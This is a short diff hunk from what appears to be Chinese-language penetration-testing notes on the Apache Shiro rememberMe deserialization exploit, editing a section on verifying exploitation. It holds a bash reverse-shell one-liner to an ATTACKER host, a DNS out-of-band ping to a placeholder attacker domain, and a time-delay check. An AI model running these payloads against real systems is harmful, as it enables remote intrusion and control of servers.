@@ -65,7 +65,7 @@ msfconsole -q -x "use exploit/multi/http/shiro_rememberme_v124_deserialize; set 
 
 ## 验证方法
 
-- DNS 外带: payload 中执行 `ping xxx.dnslog.cn`，检查 DNS 记录
+- DNS 外带: payload 中执行 `ping ATTACKER_DOMAIN`，检查 DNS 记录
 - 延时检测: payload 执行 `Thread.sleep(5000)`，观察响应延迟
 - 反弹 Shell: `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`
 
